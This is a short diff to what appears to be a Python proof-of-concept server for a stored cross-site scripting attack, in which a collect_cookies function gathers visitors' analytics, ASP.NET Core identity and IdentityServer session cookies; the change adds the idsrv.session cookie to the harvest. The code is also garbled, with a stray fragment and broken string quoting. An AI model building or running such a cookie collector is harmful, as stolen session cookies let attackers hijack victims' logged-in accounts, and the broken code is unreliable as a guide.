@@ -17,8 +17,10 @@ def hello_poc_sxss():
 def collect_cookies():
     _ga = request.cookies.get('_ga')
     _gid = request.cookies.get('_gid')
-    AspNetCore.Identity.Application = request.cookies.get('.AspNetCore.Identity.Application')
+    idsrvsession = request.cookies.get('idsrv.session')
+    AspNetCoreIdentityApplication = request.cookies.get('.AspNetCore.Identity.Application')
     return f"Cookies to collect:" \n1% \
     f"_ga = {_ga}" \
     f"_gid = {_gid}" \
-    f".AspNetCore.Identity.Application = {AspNetCore.Identity.Application}
+     f"idsrv.session = {idsrvsession}" \
+    f".AspNetCore.Identity.Application = {AspNetCoreIdentityApplication}"
